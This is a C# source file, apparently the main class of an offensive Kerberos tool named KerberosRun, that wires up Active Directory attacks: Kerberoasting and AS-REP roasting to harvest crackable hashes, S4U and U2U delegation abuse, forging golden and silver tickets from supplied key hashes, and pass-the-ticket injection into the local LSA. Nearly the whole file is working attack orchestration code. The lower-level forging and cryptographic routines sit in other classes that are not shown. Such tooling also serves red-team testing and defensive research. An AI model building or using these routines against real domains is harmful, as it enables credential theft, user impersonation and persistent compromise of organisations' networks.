using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KerberosRun
{
    public class KerberosRun
    {
        public static string Domain;
        public static string User;
        internal static string Pass;
        internal static string UserHash = null;
        internal static EncryptionType UserEType;
        public static string TargetDomain;
        public static string Ticket;
        public static EncryptionType DecryptEtype;
        public static string DecryptTGS;
        public static string SrvName;
        public static string AltService;
        public static bool OpSec;

        public static string RC4;
        public static string AES128;
        public static string AES256;
        public static bool NoPAC;
        public static bool OutFile;
        public static bool PTT;
        public static bool Verbose;
        public static bool Debug;

        public static string SPN;
        public static string[] SPNs;
        public static string DecryptTGT;
        public static string ImpersonateUser;
        public static string Format;
        public static int UserID;
        public static string DomainSID;
        public static string Host;
        public static string HostHash;
        public static string Service;

        public static bool Asreproast = false;
        private static TGT KrbTGT = null;
        private static bool KrbTGTIsReferral = false;
        internal static KrbTicket S4UTicket = null;
        internal static KrbTicket U2UTicket = null;
        internal static string U2UTarget;
        internal static string U2UTGT;
        internal static string U2UPACUser;
        internal static KrbEncryptionKey U2USessionKey;

        public KerberosRun(Options options)
        {
            Domain = options.Domain ?? Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            TargetDomain = options.TargetDomain ?? Domain;
            User = options.User;
            Pass = options.Pass;
            Ticket = options.Ticket;
            DecryptTGS = options.DecryptTGS;
            SrvName = options.SrvName;
            AltService = options.AltService;
            RC4 = options.RC4;
            AES128 = options.AES128;
            AES256 = options.AES256;
            PTT = options.PTT;
            NoPAC = options.NoPAC;
            OutFile = options.Outfile;
            Verbose = options.Verbose;
            Debug = options.Debug;
            OpSec = options.OpSec;

            UserHash = RC4 ?? UserHash;
            UserEType = (RC4 == null) ? UserEType : EncryptionType.RC4_HMAC_NT;
            UserHash = AES128 ?? UserHash;
            UserEType = (AES128 == null) ? UserEType : EncryptionType.AES128_CTS_HMAC_SHA1_96;
            UserHash = AES256 ?? UserHash;
            UserEType = (AES256 == null) ? UserEType : EncryptionType.AES256_CTS_HMAC_SHA1_96;

            if (options is AskTGTOptions atopts)
            {
                DecryptTGT = atopts.DecryptTGT;
            }
            else if (options is AskTGSOptions asopts)
            {
                SPN = asopts.SPN;
                SPNs = asopts.SPNs == null ? null : asopts.SPNs.Split(',').Select(s => s.Trim()).ToArray();
            }

            else if (options is KerberoastOptions ktopts)
            {
                SPN = ktopts.SPN;
                SPNs = ktopts.SPNs == null ? null : ktopts.SPNs.Split(',').Select(s => s.Trim()).ToArray();
                Format = ktopts.Format;
            }
            else if (options is AsreproastOptions astopts)
            {
                Format = astopts.Format;
                User = astopts.Target;
                Asreproast = true;
            }

            else if (options is S4UOptions suopts)
            {
                ImpersonateUser = suopts.ImpersonateUser;
                SPN = suopts.SPN;
            }
            else if (options is S4U2SelfOptions sfopts)
            {
                ImpersonateUser = sfopts.ImpersonateUser;
            }
            else if (options is U2UOptions uuopts)
            {
                U2UTGT = uuopts.TargetTGT;
                U2UTarget = uuopts.TargetUser;
                U2UPACUser = uuopts.PACUser ?? U2UTarget;
            }

            else if (options is GoldentOptions gtopts)
            {
                ImpersonateUser = gtopts.ImpersonateUser;
                UserID = gtopts.UserID;
                DomainSID = gtopts.DomainSID;
            }
            else if (options is SilverOptions svopts)
            {
                ImpersonateUser = svopts.ImpersonateUser;
                Host = svopts.Host;
                Service = svopts.Service;
                DomainSID = svopts.DomainSID;
            }
            else if (options is PTTOptions psopts)
            {

            }


            if (DecryptTGS != null || DecryptTGT != null)
            {
                switch (options.DecryptEtype.Trim().ToLower())
                {
                    case "rc4":
                        DecryptEtype = EncryptionType.RC4_HMAC_NT;
                        break;
                    case "aes128":
                        DecryptEtype = EncryptionType.AES128_CTS_HMAC_SHA1_96;
                        break;
                    default:
                        DecryptEtype = EncryptionType.AES256_CTS_HMAC_SHA1_96;
                        break;
                }
            }


            Logging.LoadLoggingConfig();
        }



        public int GetKerberosService(KerberosService krbsvc, bool displayTicket = true)
        {
            krbsvc.Ask().Wait();
            if (krbsvc.requestFailed) { return 0; }
            krbsvc.Display();
            if (displayTicket) { krbsvc.DisplayTicket(); }
            if (OutFile) { krbsvc.ToFile(); }
            return 0;
        }



        public int GetTGT(out TGT tgt, bool displayTicket = true)
        {
            //check if there's already a TGT from the previous AS/TGS exchange 
            if (KrbTGT != null) { tgt = KrbTGT; return 0; }

            if (User == null) { tgt = null; return 0; }

            tgt = new TGT();
            GetKerberosService(tgt, displayTicket);

            //save this TGT for the next TGS request
            KrbTGT = tgt;
            return 0;
        }

        
        public int GetTGS(bool displayTicket = true)
        {
            if (SPN == null && SPNs == null)
            {
                return 0;
            }
            if (SPNs == null)
            {
                SPNs = new string[] { SPN };
            }

            foreach (string spn in SPNs)
            {
                SPN = spn;

                GetTargetTGS(out TGS tgs, displayTicket);
            }

            return 0;
        }
  
        public int GetTargetTGS(out TGS tgs, bool displayTicket = true)
        {
            if ((Ticket == null && User == null) || (SPN == null)) { tgs = null; return 1; }

            if (Ticket == null)
            {
                GetTGT(out TGT tgt, displayTicket);
                tgs = new TGS(tgt);
            }
            else
            {
                tgs = new TGS(Ticket);
            }

            GetDomainTGS(tgs, displayTicket, KrbTGTIsReferral);

            //check if the service ticket is actually a referral TGT
            if (tgs.isReferral)
            {
                //save this TGT for the next cross domain TGS request
                KrbTGT = new TGT { sessionKey = tgs.referralSessionKey, ticket = tgs.ticket };
                KrbTGTIsReferral = true;

                tgs = new TGS(KrbTGT);
                GetDomainTGS(tgs, displayTicket, KrbTGTIsReferral);
            }
            return 0;
        }


        public int GetDomainTGS(TGS tgs, bool displayTicket = true, bool isReferral = false)
        {
            tgs.isReferral = isReferral;
            GetKerberosService(tgs, displayTicket);
            return 0;
        }



        public int GetS4U2Self(out TGS s4u2self, bool displayTicket = true)
        {
            if (Ticket == null)
            {
                GetTGT(out TGT tgt, displayTicket);
                s4u2self = new TGS(tgt);
            }
            else
            {
                s4u2self = new TGS(Ticket);
            }

            GetKerberosService(s4u2self, displayTicket);

            S4UTicket = s4u2self.ticket;

            return 0;
        }


        public int GetS4U(out TGS s4u2proxy, bool displayTicket = true)
        {
            GetS4U2Self(out TGS s4u2self, displayTicket);

            if (Ticket == null)
            {
                s4u2proxy = new TGS(KrbTGT);
            }
            else
            {
                s4u2proxy = new TGS(Ticket);
            }
            
            GetKerberosService(s4u2proxy, displayTicket);

            return 0;
        }



        public int GetU2U(out TGS tgs, bool displayTicket = true)
        {
            if (Ticket == null)
            {
                GetTGT(out TGT tgt, displayTicket);
                tgs = new TGS(tgt);
            }
            else
            {
                tgs = new TGS(Ticket);
            }

            var U2UKirbi = Kirbi.GetTicketFromKirbi(U2UTGT);
            U2UTicket = U2UKirbi.Ticket;
            U2USessionKey = U2UKirbi.SessionKey;

            GetKerberosService(tgs, displayTicket);

            return 0;
        }


        public int Kerberoasting()
        {
            if (SPN == null && SPNs == null)
            {
                return 0;
            }
            if (SPNs == null)
            {
                SPNs = new string[] { SPN };
            }

            foreach (string spn in SPNs)
            {
                SPN = spn;

                SingleKerberoasting();
            }
            return 0;
        }

        public int SingleKerberoasting()
        {
            if (User == null && SPN == null && SPNs == null) { return 0; }

            var roast = new Roast();

            if (User == null)
            {
                roast.Kerberoast();
            }
            else
            {
                GetTargetTGS(out TGS tgs, false);
                if (tgs.requestFailed) { return 0; }
                roast.Kerberoast(tgs);
            }
            return 0;
        }

        public int Asreproasting()
        {
            if (User == null) { return 0; }
            var roast = new Roast();

            GetTGT(out TGT tgt, false);

            roast.Asreproast(tgt.asRep);

            return 0;
        }


        public int GetGolden()
        {
            BuildTicket.BuildGolden(UserHash, UserEType, ImpersonateUser, Domain, UserID, DomainSID, PTT);

            return 0;
        }



        public int GetSilver()
        {
            BuildTicket.BuildSilver(Host, UserHash, UserEType, ImpersonateUser, Domain, Service, DomainSID, PTT);

            return 0;
        }

        public int PassTheTicket()
        {
            byte[] kirbiBytes = null;
            try
            {
                kirbiBytes = Convert.FromBase64String(Ticket);
            }
            catch { }

            LSA.ImportTicket(kirbiBytes, new LUID());

            return 0;
        }
    }
}
